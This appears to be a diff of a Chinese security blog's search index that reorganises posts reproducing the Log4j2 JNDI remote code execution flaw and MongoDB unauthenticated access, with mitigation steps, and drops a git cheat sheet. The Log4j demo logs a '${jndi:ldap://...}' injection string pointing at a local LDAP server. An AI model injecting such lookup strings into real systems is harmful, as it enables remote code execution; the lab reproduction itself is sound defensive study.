@@ -1,9 +1,9 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Apache Log4j2RCE漏洞复现</title>
+    <title>Apache Log4j2 RCE漏洞复现</title>
     <url>/2021/12/11/Apache%20Log4j2%20RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="Apache-Log4j2RCE漏洞复现"><a href="#Apache-Log4j2RCE漏洞复现" class="headerlink" title="Apache Log4j2RCE漏洞复现"></a>Apache Log4j2RCE漏洞复现</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Apache Log4j2是一个基于Java的日志记录工具。该工具重写了Log4j框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。</p>
+    <content><![CDATA[<h1 id="Apache-Log4j2-RCE漏洞复现"><a href="#Apache-Log4j2-RCE漏洞复现" class="headerlink" title="Apache Log4j2 RCE漏洞复现"></a>Apache Log4j2 RCE漏洞复现</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Apache Log4j2是一个基于Java的日志记录工具。该工具重写了Log4j框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。</p>
 <p><strong>此次漏洞触发条件为只要外部用户输入的数据会被日志记录，即可造成远程代码执行</strong></p>
 <h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache Log4j 2.x &lt;= 2.14.1</span><br></pre></td></tr></table></figure>
 
@@ -17,81 +17,16 @@
 
 
 <p>点击下载相应程序包资源</p>
-<p>![image-20211210134809897](Apache Log4j2RCE漏洞复现&#x2F;image-20211210134809897.png)</p>
+<p>![image-20220207115326014](Apache Log4j2 RCE漏洞复现&#x2F;image-20220207115326014.png)</p>
 <p>这里使用JNDI注入工具开启rmi服务或者idap服务执行本地命令，如下:</p>
-<p>![](Apache Log4j2RCE漏洞复现&#x2F;image-20211210135143848.png)</p>
+<p>![image-20220207115341295](Apache Log4j2 RCE漏洞复现&#x2F;image-20220207115341295.png)</p>
 <p>下面为测试Demo(由于我的jdk版本不适用RMI-JDNI注入，这里使用的是ldap协议)</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger(Test.class);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:1389/ehm23c&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
 
 <p>运行结果:</p>
-<p>![](Apache Log4j2RCE漏洞复现&#x2F;image-20211210135519958.png)</p>
-<h2 id="痕迹分析"><a href="#痕迹分析" class="headerlink" title="痕迹分析"></a>痕迹分析</h2><p>主要查看日志，观察日志中是否存在错误记录</p>
-<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>经验证 2.15.0-rc1 版本存在绕过，实际受影响范围如下：</p>
-<p>Apache Log4j 2.x &lt; 2.15.0-rc2</p>
-<p>影响判断方式：用户只需排查Java应用是否引入 log4j-api , log4j-core 两个jar。若存在应用使用，极大可能会受到影响。</p>
-<p><strong>已知影响组件</strong></p>
-<ul>
-<li>Apache Struts2</li>
-<li>Apache Solr</li>
-<li>Apache Flink</li>
-<li>Apache Druid</li>
-<li>ElasticSearch</li>
-<li>flume</li>
-<li>dubbo</li>
-<li>Redis</li>
-<li>logstash</li>
-<li>kafka</li>
-</ul>
-<h2 id="防护方案"><a href="#防护方案" class="headerlink" title="防护方案"></a>防护方案</h2><p>1、禁止使用 log4j 服务器外连，升级 jdk 11.0.1 8u191 7u201 6u211 或更高版本。 </p>
-<p>2、升级至 log4j-2.15.0-rc2： </p>
-<p>下载地址：<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a> </p>
-<p>3、紧急缓解措施： </p>
-<p>（1） 修改 jvm 参数 -Dlog4j2.formatMsgNoLookups&#x3D;true </p>
-<p>（2） 修改配置 log4j2.formatMsgNoLookups&#x3D;True </p>
-<p>（3） 将系统环境变量FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置 为 true</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] <a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1</a></p>
-<p>[2] [<a href="https://issues.apache.org/jira/projects/LOG4J2/issues/LOG4J2-3201?filter=allissues">LOG4J2-3201] Limit the protocols jNDI can use and restrict LDAP. - ASF JIRA (apache.org)</a></p>
-<p>[3] <a href="https://gitbox.apache.org/repos/asf?p=logging-log4j2.git;a=blob;f=log4j-core/src/test/java/org/apache/logging/log4j/core/lookup/JndiRestrictedLookupTest.java;h=032c9c4d85204e6490a734724c8d549c50de7164;hb=d82b47c">ASF Git Repos - logging-log4j2.git&#x2F;blob - log4j-core&#x2F;src&#x2F;test&#x2F;java&#x2F;org&#x2F;apache&#x2F;logging&#x2F;log4j&#x2F;core&#x2F;lookup&#x2F;JndiRestrictedLookupTest.java</a></p>
-<p>[4] <a href="https://mp.weixin.qq.com/s/RXSiFrj5UOs3kzXSUsMbvw">Apache Log4j2RCE漏洞复现 (qq.com)</a></p>
-]]></content>
-      <categories>
-        <category>Web漏洞</category>
-        <category>Web容器漏洞</category>
-        <category>Apache</category>
-      </categories>
-      <tags>
-        <tag>-web漏洞 -Apache漏洞 -Log4j2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Apache Log4j2RCE漏洞复现</title>
-    <url>/2021/12/11/Apache%20Log4j2RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="Apache-Log4j2RCE漏洞复现"><a href="#Apache-Log4j2RCE漏洞复现" class="headerlink" title="Apache Log4j2RCE漏洞复现"></a>Apache Log4j2RCE漏洞复现</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Apache Log4j2是一个基于Java的日志记录工具。该工具重写了Log4j框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。</p>
-<p><strong>此次漏洞触发条件为只要外部用户输入的数据会被日志记录，即可造成远程代码执行</strong></p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache Log4j 2.x &lt;= 2.14.1</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="漏洞简析"><a href="#漏洞简析" class="headerlink" title="漏洞简析"></a>漏洞简析</h3><p>由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。</p>
-<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>在IDEA中新建一个Maven项目，在pom.xml中导入依赖文件下载log4j程序包</p>
-<p>pom.xml文件如下:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">        &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>点击下载相应程序包资源</p>
-<p>![image-20211210134809897](Apache Log4j2 RCE漏洞复现&#x2F;image-20211210134809897.png)</p>
-<p>这里使用JNDI注入工具开启rmi服务或者idap服务执行本地命令，如下:</p>
-<p>![](Apache Log4j2 RCE漏洞复现&#x2F;image-20211210135143848.png)</p>
-<p>下面为测试Demo(由于我的jdk版本不适用RMI-JDNI注入，这里使用的是ldap协议)</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger(Test.class);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:1389/ehm23c&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>运行结果:</p>
-<p>![](Apache Log4j2 RCE漏洞复现&#x2F;image-20211210135519958.png)</p>
+<p>![image-20220207115350383](Apache Log4j2 RCE漏洞复现&#x2F;image-20220207115350383.png)</p>
 <h2 id="痕迹分析"><a href="#痕迹分析" class="headerlink" title="痕迹分析"></a>痕迹分析</h2><p>主要查看日志，观察日志中是否存在错误记录</p>
 <h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>经验证 2.15.0-rc1 版本存在绕过，实际受影响范围如下：</p>
 <p>Apache Log4j 2.x &lt; 2.15.0-rc2</p>
@@ -1181,100 +1116,6 @@
       </tags>
   </entry>
   <entry>
-    <title>MongoDB未授权访问漏洞</title>
-    <url>/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="MongoDB未授权访问"><a href="#MongoDB未授权访问" class="headerlink" title="MongoDB未授权访问"></a>MongoDB未授权访问</h1><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p>测试环境：Centos7</p>
-<p>安装前先安装依赖包</p>
-<p><strong>Red Hat&#x2F;CentOS：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum install libcurl openssl</span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>Ubuntu 18.04 LTS (“Bionic”)&#x2F;Debian 10 “Buster”：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libcurl4 openssl</span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>Ubuntu 16.04 LTS (“Xenial”)&#x2F;Debian 9 “Stretch”：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libcurl3 openssl</span><br></pre></td></tr></table></figure>
-
-
-
-<p>下载MongoDB</p>
-<p>MongoDB 源码下载地址：<a href="https://www.mongodb.com/download-center/#community">https://www.mongodb.com/download-center\#community</a></p>
-<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/1ed1e326da0b82a3ba6a9acc177ad6d1.jpg" class>
-
-
-
-<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/5fc344136eee4a58c0d0dcd509a488df.jpg" class>
-
-<p>MongoDB的可执行文件在bin目录下，将其添加到$PATH路径中</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PATH=\&lt;mongodb-install-directory\&gt;/bin:\$PATH</span><br></pre></td></tr></table></figure>
-
-
-
-<p>创建数据库目录</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mkdir -p /data/db</span><br></pre></td></tr></table></figure>
-
-
-
-<p>创建数据库存放目录和日志</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /data               //创建数据库目录</span><br><span class="line"></span><br><span class="line">sudo mkdir db    //创建日志</span><br><span class="line"></span><br><span class="line">sudo touch log</span><br></pre></td></tr></table></figure>
-
-
-
-<p>命令行中启动MongoDB服务</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> cd 安装路径/mongo/bin</span><br><span class="line"></span><br><span class="line">sudo ./mongod --dbpath=/data/db --   logpath=/data/logs</span><br></pre></td></tr></table></figure>
-
-
-
-<p>Mongodb启动成功</p>
-<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/393a5bd543d9da0ed85c0dec2efcdec4.png" class>
-
-
-
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>登录Mongodb控制台</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令: mongod 127.0.0.1:27017</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/996ace683b6e8b7130df8cda3d0efc62.png" class>
-
-
-
-<p>登录成功后，使用语句进行查询操作，发现数据库admin没有数据，没有添加用户</p>
-<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/3186b9e9e72cf57cf9585d9f09ddbcbe.png" class>
-
-
-
-<h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>(1) 为 MongoDB 添加认证</p>
-<p>① MongoDB 启动时添加 -auth 参数。</p>
-<p>② 给 MongoDB 添加用户</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use admin \# 使用 admin 库</span><br><span class="line"></span><br><span class="line">db.addUser“用户名” “密码”\# 添加用户名、密码</span><br><span class="line"></span><br><span class="line">db.auth“用户名”,“密码”\# 验证是否添加成功返回 1 说明成功。</span><br></pre></td></tr></table></figure>
-
-
-
-<p>(2) 禁用 HTTP 和 REST 端口</p>
-<p>MongoDB 自身带有一个 HTTP 服务并支持 REST 接口。在 2.6<br>版本以后这些接口默认关闭。MongoDB 默认会使用默认端口监听 Web 服务一般不需要通过<br>Web 方式进行远程管理建议禁用。修改配置文件或在启动时选择 -nohttpinterface 参数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nohttpinterface = false</span><br></pre></td></tr></table></figure>
-
-
-
-<p>(3) 限制绑定 IP</p>
-<p>启动时加入参数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--bind_ip 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<p>或在 &#x2F;etc&#x2F;mongodb.conf 文件中添加以下内容 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bind_ip = 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Web漏洞</category>
-        <category>未授权访问</category>
-      </categories>
-      <tags>
-        <tag>-Web漏洞 -未授权访问 -MongoDB</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Mimikatz运行姿势</title>
     <url>/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/</url>
     <content><![CDATA[<h1 id="Mimikatz运行姿势"><a href="#Mimikatz运行姿势" class="headerlink" title="Mimikatz运行姿势"></a>Mimikatz运行姿势</h1><hr>
@@ -1508,6 +1349,100 @@
       </categories>
       <tags>
         <tag>-内网渗透 -工具使用 -免杀处理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MongoDB未授权访问漏洞</title>
+    <url>/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="MongoDB未授权访问"><a href="#MongoDB未授权访问" class="headerlink" title="MongoDB未授权访问"></a>MongoDB未授权访问</h1><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p>测试环境：Centos7</p>
+<p>安装前先安装依赖包</p>
+<p><strong>Red Hat&#x2F;CentOS：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum install libcurl openssl</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>Ubuntu 18.04 LTS (“Bionic”)&#x2F;Debian 10 “Buster”：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libcurl4 openssl</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>Ubuntu 16.04 LTS (“Xenial”)&#x2F;Debian 9 “Stretch”：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libcurl3 openssl</span><br></pre></td></tr></table></figure>
+
+
+
+<p>下载MongoDB</p>
+<p>MongoDB 源码下载地址：<a href="https://www.mongodb.com/download-center/#community">https://www.mongodb.com/download-center\#community</a></p>
+<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/1ed1e326da0b82a3ba6a9acc177ad6d1.jpg" class>
+
+
+
+<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/5fc344136eee4a58c0d0dcd509a488df.jpg" class>
+
+<p>MongoDB的可执行文件在bin目录下，将其添加到$PATH路径中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PATH=\&lt;mongodb-install-directory\&gt;/bin:\$PATH</span><br></pre></td></tr></table></figure>
+
+
+
+<p>创建数据库目录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mkdir -p /data/db</span><br></pre></td></tr></table></figure>
+
+
+
+<p>创建数据库存放目录和日志</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /data               //创建数据库目录</span><br><span class="line"></span><br><span class="line">sudo mkdir db    //创建日志</span><br><span class="line"></span><br><span class="line">sudo touch log</span><br></pre></td></tr></table></figure>
+
+
+
+<p>命令行中启动MongoDB服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> cd 安装路径/mongo/bin</span><br><span class="line"></span><br><span class="line">sudo ./mongod --dbpath=/data/db --   logpath=/data/logs</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Mongodb启动成功</p>
+<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/393a5bd543d9da0ed85c0dec2efcdec4.png" class>
+
+
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>登录Mongodb控制台</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令: mongod 127.0.0.1:27017</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/996ace683b6e8b7130df8cda3d0efc62.png" class>
+
+
+
+<p>登录成功后，使用语句进行查询操作，发现数据库admin没有数据，没有添加用户</p>
+<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/3186b9e9e72cf57cf9585d9f09ddbcbe.png" class>
+
+
+
+<h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>(1) 为 MongoDB 添加认证</p>
+<p>① MongoDB 启动时添加 -auth 参数。</p>
+<p>② 给 MongoDB 添加用户</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use admin \# 使用 admin 库</span><br><span class="line"></span><br><span class="line">db.addUser“用户名” “密码”\# 添加用户名、密码</span><br><span class="line"></span><br><span class="line">db.auth“用户名”,“密码”\# 验证是否添加成功返回 1 说明成功。</span><br></pre></td></tr></table></figure>
+
+
+
+<p>(2) 禁用 HTTP 和 REST 端口</p>
+<p>MongoDB 自身带有一个 HTTP 服务并支持 REST 接口。在 2.6<br>版本以后这些接口默认关闭。MongoDB 默认会使用默认端口监听 Web 服务一般不需要通过<br>Web 方式进行远程管理建议禁用。修改配置文件或在启动时选择 -nohttpinterface 参数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nohttpinterface = false</span><br></pre></td></tr></table></figure>
+
+
+
+<p>(3) 限制绑定 IP</p>
+<p>启动时加入参数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--bind_ip 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p>或在 &#x2F;etc&#x2F;mongodb.conf 文件中添加以下内容 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bind_ip = 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Web漏洞</category>
+        <category>未授权访问</category>
+      </categories>
+      <tags>
+        <tag>-Web漏洞 -未授权访问 -MongoDB</tag>
       </tags>
   </entry>
   <entry>
@@ -2094,82 +2029,6 @@
       </tags>
   </entry>
   <entry>
-    <title></title>
-    <url>/2022/01/17/git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
-    <content><![CDATA[<h1 id="git常用命令"><a href="#git常用命令" class="headerlink" title="git常用命令"></a>git常用命令</h1><hr>
-<h2 id="1、常用"><a href="#1、常用" class="headerlink" title="1、常用"></a>1、常用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git remote add origin git@github.com:yeszao/dofiler.git     # 配置远程git版本库</span><br><span class="line"></span><br><span class="line">git pull origin master                     # 下载代码及快速合并</span><br><span class="line"></span><br><span class="line">git push origin master                     # 上传代码及快速合并</span><br><span class="line"></span><br><span class="line">git fetch origin                        # 从远程库获取代码</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">git branch                           # 显示所有分支</span><br><span class="line"></span><br><span class="line">git checkout master                       # 切换到master分支</span><br><span class="line"></span><br><span class="line">git checkout -b dev                       # 创建并切换到dev分支</span><br><span class="line"></span><br><span class="line">git commit -m &quot;first version&quot;                  # 提交</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">git status                           # 查看状态</span><br><span class="line"></span><br><span class="line">git log                             # 查看提交历史</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">git config --global core.editor vim               # 设置默认编辑器为vim（git默认用nano）</span><br><span class="line"></span><br><span class="line">git config core.ignorecase false                # 设置大小写敏感</span><br><span class="line"></span><br><span class="line">git config --global user.name &quot;YOUR NAME&quot;            # 设置用户名</span><br><span class="line"></span><br><span class="line">git config --global user.email &quot;YOUR EMAIL ADDRESS&quot;       # 设置邮箱</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="2、别名alias"><a href="#2、别名alias" class="headerlink" title="2、别名alias"></a>2、别名alias</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global alias.br=&quot;branch&quot;                 # 创建/查看本地分支</span><br><span class="line"></span><br><span class="line">git config --global alias.co=&quot;checkout&quot;               # 切换分支</span><br><span class="line"></span><br><span class="line">git config --global alias.cb=&quot;checkout -b&quot;            # 创建并切换到新分支</span><br><span class="line"></span><br><span class="line">git config --global alias.cm=&quot;commit -m&quot;              # 提交</span><br><span class="line"></span><br><span class="line">git config --global alias.st=&quot;status&quot;                 # 查看状态</span><br><span class="line"></span><br><span class="line">git config --global alias.pullm=&quot;pull origin master&quot;  # 拉取分支</span><br><span class="line"></span><br><span class="line">git config --global alias.pushm=&quot;push origin master&quot;  # 提交分支</span><br><span class="line"></span><br><span class="line">git config --global alias.log=&quot;git log --oneline --graph --decorate --color=always&quot; # 单行、分颜色显示记录</span><br><span class="line"></span><br><span class="line">git config --global alias.logg=&quot;git log --graph --all --format=format:&#x27;%C(bold blue)%h%C(reset) - %C(bold green)(%ar)%C(reset) %C(white)%s%C(reset) %C(bold white)— %an%C(reset)%C(bold yellow)%d%C(reset)&#x27; --abbrev-commit --date=relative&quot; # 复杂显示</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="3、创建版本库"><a href="#3、创建版本库" class="headerlink" title="3、创建版本库"></a>3、创建版本库</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone                  # 克隆远程版本库</span><br><span class="line"></span><br><span class="line">git init                        # 初始化本地版本库</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="4、修改和提交"><a href="#4、修改和提交" class="headerlink" title="4、修改和提交"></a>4、修改和提交</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git status                      # 查看状态</span><br><span class="line"></span><br><span class="line">git diff                        # 查看变更内容</span><br><span class="line"></span><br><span class="line">git add .                       # 跟踪所有改动过的文件</span><br><span class="line"></span><br><span class="line">git add                   # 跟踪指定的文件</span><br><span class="line"></span><br><span class="line">git mv               # 文件改名</span><br><span class="line"></span><br><span class="line">git rm                    # 删除文件</span><br><span class="line"></span><br><span class="line">git rm --cached           # 停止跟踪文件但不删除</span><br><span class="line"></span><br><span class="line">git commit -m “commit message”  # 提交所有更新过的文件</span><br><span class="line"></span><br><span class="line">git commit --amend              # 修改最后一次提交</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="5、查看历史"><a href="#5、查看历史" class="headerlink" title="5、查看历史"></a>5、查看历史</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git log                         # 查看提交历史</span><br><span class="line"></span><br><span class="line">git log -p                # 查看指定文件的提交历史</span><br><span class="line"></span><br><span class="line">git blame                 # 以列表方式查看指定文件的提交历史</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="6、撤销"><a href="#6、撤销" class="headerlink" title="6、撤销"></a>6、撤销</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git reset --hard HEAD           # 撤消工作目录中所有未提交文件的修改内容</span><br><span class="line"></span><br><span class="line">git reset --hard       # 撤销到某个特定版本</span><br><span class="line"></span><br><span class="line">git checkout HEAD         # 撤消指定的未提交文件的修改内容</span><br><span class="line"></span><br><span class="line">git checkout --           # 同上一个命令</span><br><span class="line"></span><br><span class="line">git revert              # 撤消指定的提交分支与标签</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="7、分支与标签"><a href="#7、分支与标签" class="headerlink" title="7、分支与标签"></a>7、分支与标签</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git branch                      # 显示所有本地分支</span><br><span class="line"></span><br><span class="line">git checkout        # 切换到指定分支或标签</span><br><span class="line"></span><br><span class="line">git branch          # 创建新分支</span><br><span class="line"></span><br><span class="line">git branch -d           # 删除本地分支</span><br><span class="line"></span><br><span class="line">git tag                         # 列出所有本地标签</span><br><span class="line"></span><br><span class="line">git tag                # 基于最新提交创建标签</span><br><span class="line"></span><br><span class="line">git tag -a &quot;v1.0&quot; -m &quot;一些说明&quot;  # -a指定标签名称，-m指定标签说明</span><br><span class="line"></span><br><span class="line">git tag -d             # 删除标签</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">git checkout dev                # 合并特定的commit到dev分支上</span><br><span class="line"></span><br><span class="line">git cherry-pick 62ecb3</span><br></pre></td></tr></table></figure>
-
-
-
